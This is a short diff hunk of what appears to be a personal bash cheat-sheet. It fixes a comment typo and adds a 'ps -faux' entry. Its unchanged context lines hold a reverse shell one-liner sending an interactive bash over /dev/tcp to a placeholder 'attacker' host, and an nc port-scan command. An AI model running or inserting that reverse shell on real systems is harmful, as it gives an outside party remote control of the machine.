@@ -34,9 +34,13 @@ bash -c 'bash -i >& /dev/tcp/attacker/7777 0>&1'
 # bash nc scan
 sudo nc -zvw 1 localhost 1-1000|grep -v failed
 
-# bash http reques
+# bash http request
 exec 5<>/dev/tcp/www.google.com/80
 echo -e "GET / HTTP/1.1\r\nhost: www.google.com\r\nConnection: close\r\n\r\n" >&5
 cat <&5
+
+# ps
+ps -faux
+
 
 $ IP_VERSION: echo '4 6' | tr ' ' '\n'
